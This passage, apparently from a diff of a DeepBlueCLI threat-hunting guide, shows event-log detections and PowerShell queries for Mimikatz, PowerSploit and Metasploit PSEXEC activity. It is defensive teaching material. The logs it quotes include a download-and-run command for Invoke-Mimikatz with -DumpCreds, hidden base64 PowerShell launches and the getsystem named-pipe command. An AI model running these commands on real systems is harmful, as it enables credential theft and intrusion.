-
-Date    : 9/20/2016 11:45:24 AM
-Log     : Security
-EventID : 4688
-Message : Suspicious Command Line
-Results : Download via Net.WebClient DownloadString
-          Command referencing Mimikatz
-          PowerSploit Invoke-Mimikatz.ps1
-          Use of PowerSploit
-
-Command : powershell.exe  "IEX (New-Object Net.WebClient).DownloadString('hxxps://raw[.]githubusercontent[.]com/mattifestat
-          ion/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
-=================================================================================
-Date    : 9/20/2016 12:19:26 PM
-Log     : Security
-EventID : 4688
-Message : Suspicious Command Line
-Results : Long Command Line: greater than 1000 bytes
-          500+ consecutive Base64 characters
-          Base64 encoded and hidden PowerShell command
-          Base64-encoded function
-          Download via Net.WebClient DownloadString
-          User-Agent set via command line
-
-Command : powershell.exe  -NoP -sta -NonI -W Hidden -Enc JABXAGMAPQBOAGUA...EIALQBqAG8AaQBOACcAJwApAA==
-Decoded : $Wc=New-OBJECT ...
-
-Date    : 9/20/2016 12:15:54 PM
-Log     : Security
-EventID : 4688
-Message : Suspicious Command Line
-Results : Long Command Line: greater than 1000 bytes
-          500+ consecutive Base64 characters
-          Base64 encoded and hidden PowerShell command
-          Base64-encoded function
-          Download via Net.WebClient DownloadString
-          User-Agent set via command line
-
-Command : powershell.exe  -NoP -sta -NonI -W Hidden -Enc WwBTAFk...BPAEkATgAnACcAKQA=
-Decoded : [SYStEm.NET.SErvICePoiNTMANaGEr]::...
-
-```
-```
-PS > Get-WinEvent -FilterHashtable @{Path=".\evtx\powersploit-security.evtx",".\evtx\powersploit-system.evtx"; id=4688} | 
-    Where-Object { $_.Message -ilike "*powershell*" } |
-    Select-Object -ExpandProperty Message
-
-Subject:
-        Security ID:            S-1-5-21-3463664321-2923530833-3546627382-1000
-        Account Name:           IEUser
-        Account Domain:         IE10WIN7
-        Logon ID:               0x6793C
-
-Process Information:
-        New Process ID:         0x11c
-        New Process Name:       C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
-        Token Elevation Type:   TokenElevationTypeFull (2)
-        Creator Process ID:     0x98c
-        Process Command Line:   powershell.exe  -NoP -sta -NonI -W Hidden -Enc JABXAGM..aQBOACcAJwApAA==
-
-A new process has been created.
-
-Subject:
-        Security ID:            S-1-5-21-3463664321-2923530833-3546627382-1000
-        Account Name:           IEUser
-        Account Domain:         IE10WIN7
-        Logon ID:               0x6793C
-
-Process Information:
-        New Process ID:         0x700
-        New Process Name:       C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
-        Token Elevation Type:   TokenElevationTypeFull (2)
-        Creator Process ID:     0xf14
-        Process Command Line:   powershell.exe  "IEX (New-Object Net.WebClient).DownloadString('hxxp://eic[.]me/17'); Invoke-Mimikatz -DumpCreds"
-```
-
-## Mimikatz `lsadump::sam`
-
-|Event|Command|
-|-----|-------|
-|Mimikatz `lsadump::sam`|`.\DeepBlue.ps1 .\evtx\mimikatz-privesc-hashdump.evtx`|
-
-```
-Date    : 4/30/2019 11:08:29 AM
-Log     : Security
-EventID : 4673
-Message : Sensititive Privilege Use Exceeds Threshold
-Results : Potentially indicative of Mimikatz, multiple sensitive privilege calls have been made.
-          Username: Sec504
-          Domain Name: SEC504STUDENT
-```
-```
-PS > Get-WinEvent -FilterHashtable @{Path=".\evtx\powersploit-security.evtx",".\evtx\mimikatz-privesc-hashdump.evtx"; id=4673} | fl
-
-TimeCreated  : 4/30/2019 11:08:29 AM
-ProviderName : Microsoft-Windows-Security-Auditing
-Id           : 4673
-Message      : A privileged service was called.
-
-               Subject:
-                Security ID:            S-1-5-21-2977773840-2930198165-1551093962-1000
-                Account Name:           Sec504
-                Account Domain:         SEC504STUDENT
-                Logon ID:               0x1E3DD
-
-               Service:
-                Server: Security
-                Service Name:   -
-
-               Process:
-                Process ID:     0x15a8
-                Process Name:   C:\Tools\mimikatz\mimikatz.exe
-
-               Service Request Information:
-                Privileges:             SeTcbPrivilege
-```
-
-## Metasploit (PSEXEC) Native Target (Security)
-|Event|Command|
-|-----|-------|
-|Metasploit native target (security)|`.\DeepBlue.ps1 .\evtx\metasploit-psexec-native-target-security.evtx`|
-
-With process monitoring, hunt for processes matching these criteria:
-
-- parent process is services.exe
-- process name is cmd.exe
-- command line includes echo AND \pipe\
-
-
-```
-Date    : 9/20/2016 8:41:13 PM
-Log     : Security
-EventID : 4688
-Message : Suspicious Command Line
-Results : Metasploit-style cmd with pipe (possible use of Meterpreter 'getsystem')
-
-Command : cmd.exe /c echo hgabms > \\.\pipe\hgabms
-Decoded :
-```
-```
-PS > Get-WinEvent -FilterHashtable @{Path=".\evtx\metasploit-psexec-native-target-security.evtx"; id=4688} | fl
-
-
-TimeCreated  : 9/20/2016 8:41:13 PM
-ProviderName : Microsoft-Windows-Security-Auditing
-Id           : 4688
-Message      : A new process has been created.
-
-               Subject:
-                Security ID:            S-1-5-18
-                Account Name:           IE10WIN7$
-                Account Domain:         WORKGROUP
-                Logon ID:               0x3E7
-
-               Process Information:
-                New Process ID:         0x694
-                New Process Name:       C:\Windows\System32\cmd.exe
-                Token Elevation Type:   TokenElevationTypeDefault (1)
-                Creator Process ID:     0x1e8
-                Process Command Line:   cmd.exe /c echo hgabms > \\.\pipe\hgabms
-```
-## Metasploit (PSEXEC) Native Target (System)
-|Event|Command|
-|-----|-------|
-|Metasploit native target (system)|`.\DeepBlue.ps1 .\evtx\metasploit-psexec-native-target-system.evtx`|
-
-Reference:
-- [Hunting for GetSystem in offensive security tools](https://redcanary.com/blog/getsystem-offsec/)
-
-With Windows Event Logs, search for events with the ID 7045 that match these criteria:
-
-- ServiceFileName contains cmd.exe OR %COMSPEC%
-- ServiceFileName contains echo AND \pipe\
-
-```
-Date    : 9/20/2016 8:41:13 PM
-Log     : System
-EventID : 7045
-Message : Suspicious Service Command
-Results : Service name: hgabms
-          Metasploit-style cmd with pipe (possible use of Meterpreter 'getsystem')
-
-Command : cmd.exe /c echo hgabms > \\.\pipe\hgabms
-Decoded :
-
-Date    : 9/20/2016 8:41:02 PM
-Log     : System
-EventID : 7036
-Message : Suspicious Service Name
-Results : Service name: KgXItsbKgTJzdzwl
-          Metasploit-style service name: 16 characters
-
-Command :
-Decoded :
-
-Date    : 9/20/2016 8:41:02 PM
-Log     : System
-EventID : 7045
-Message : New Service Created
-Results : Service name: KgXItsbKgTJzdzwl
-          Metasploit-style service name: 16 characters
-
-Date    : 9/20/2016 8:41:02 PM
-Log     : System
-EventID : 7045
-Message : New Service Created
-Results : Service name: KgXItsbKgTJzdzwl
-          Metasploit-style service name: 16 characters
-
-Command : %SYSTEMROOT%\duKhLYUX.exe
-Decoded :
-
-Date    : 9/20/2016 8:41:02 PM
-Log     : System
-EventID : 7045
-Message : Suspicious Service Command
-Results : Service name: KgXItsbKgTJzdzwl
-```
-```
-PS > Get-WinEvent -FilterHashtable @{Path=".\evtx\metasploit-psexec-native-target-system.evtx"; id=7045,7036} | fl
-
-
-TimeCreated  : 9/20/2016 8:41:13 PM
-ProviderName : Service Control Manager
-Id           : 7045
-Message      : A service was installed in the system.
-
-               Service Name:  hgabms
-               Service File Name:  cmd.exe /c echo hgabms > \\.\pipe\hgabms
-               Service Type:  user mode service
-               Service Start Type:  demand start
-               Service Account:  LocalSystem
-
-TimeCreated  : 9/20/2016 8:41:03 PM
-ProviderName : Service Control Manager
-Id           : 7036
-Message      : The Application Experience service entered the running state.
-
-TimeCreated  : 9/20/2016 8:41:02 PM
-ProviderName : Service Control Manager
-Id           : 7036
-Message      : The KgXItsbKgTJzdzwl service entered the stopped state.
-
-TimeCreated  : 9/20/2016 8:41:02 PM
-ProviderName : Service Control Manager
-Id           : 7036
-Message      : The KgXItsbKgTJzdzwl service entered the running state.
-
-TimeCreated  : 9/20/2016 8:41:02 PM
-ProviderName : Service Control Manager
-Id           : 7045
-Message      : A service was installed in the system.
-
-               Service Name:  KgXItsbKgTJzdzwl
-               Service File Name:  %SYSTEMROOT%\duKhLYUX.exe
-               Service Type:  user mode service
-               Service Start Type:  demand start
-               Service Account:  LocalSystem
-```
-
-## Metasploit PowerShell Target (Security/System)
-|Event|Command|
-|-----|-------|
-|Metasploit PowerShell target (security)|` .\DeepBlue.ps1 .\evtx\metasploit-psexec-powershell-target-security.evtx`|
-|Metasploit PowerShell target (system)|` .\DeepBlue.ps1 .\evtx\metasploit-psexec-powershell-target-system.evtx`|
-
-```
-Date    : 9/20/2016 9:35:58 AM
-Log     : Security
-EventID : 4688
-Message : Suspicious Command Line
-Results : Metasploit-style cmd with pipe (possible use of Meterpreter 'getsystem')
-
-Command : cmd.exe /c echo genusn > \\.\pipe\genusn
-Decoded :
-
-Date    : 9/20/2016 9:35:46 AM
-Log     : System
-EventID : 7045
-Message : Suspicious Service Command
-Results : Service name: UWdKhYTIQWWJxHfx
-          Long Command Line: greater than 1000 bytes
-          Metasploit-style base64 encoded/compressed PowerShell function (possible use of Metasploit PowerShell exploit payload)
-          500+ consecutive Base64 characters
-          Base64-encoded and compressed function
-
-Command : %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden ....
-```
-
-```
-PS > Get-WinEvent -FilterHashtable @{Path=".\evtx\metasploit-psexec-powershell-target-security.evtx",".\evtx\metasploit-psexec-powershell-target-system.evtx"; id=4688,7045} | Where-Object { $_.Message -ilike "*echo*" -or $_.Message -ilike "*cmd.exe*" -or $_.Message -ilike "*COMSPEC*" -or $_.Message -ilike "*\\pipe\\*" } | Format-List
-
-TimeCreated  : 9/20/2016 9:35:58 AM
-ProviderName : Service Control Manager
-Id           : 7045
-Message      : A service was installed in the system.
-
-               Service Name:  genusn
-               Service File Name:  cmd.exe /c echo genusn > \\.\pipe\genusn
-               Service Type:  user mode service
-               Service Start Type:  demand start
-               Service Account:  LocalSystem
-
-TimeCreated  : 9/20/2016 9:35:46 AM
-ProviderName : Service Control Manager
-Id           : 7045
-Message      : A service was installed in the system.
-
-               Service Name:  UWdKhYTIQWWJxHfx
-               Service File Name:  %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden ....
-TimeCreated  : 9/20/2016 9:35:58 AM
-ProviderName : Microsoft-Windows-Security-Auditing
-Id           : 4688
-Message      : A new process has been created.
-
-               Subject:
-                Security ID:            S-1-5-18
-                Account Name:           IE10WIN7$
-                Account Domain:         WORKGROUP
-                Logon ID:               0x3E7
-
-               Process Information:
-                New Process ID:         0xe8c
-                New Process Name:       C:\Windows\System32\cmd.exe
-                Token Elevation Type:   TokenElevationTypeDefault (1)
-                Creator Process ID:     0x1cc
-                Process Command Line:   cmd.exe /c echo genusn > \
-TimeCreated  : 9/20/2016 9:35:46 AM
-ProviderName : Microsoft-Windows-Security-Auditing
-Id           : 4688
-Message      : A new process has been created.
-
-               Subject:
-                Security ID:            S-1-5-18
-                Account Name:           IE10WIN7$
-                Account Domain:         WORKGROUP
-                Logon ID:               0x3E7
-
-               Process Information:
-                New Process ID:         0xb2c
-                New Process Name:       C:\Windows\System32\cmd.exe
-                Token Elevation Type:   TokenElevationTypeDefault (1)
-                Creator Process ID:     0x1cc
-                Process Command Line:   C:\Windows\system32\cmd.exe
 ```
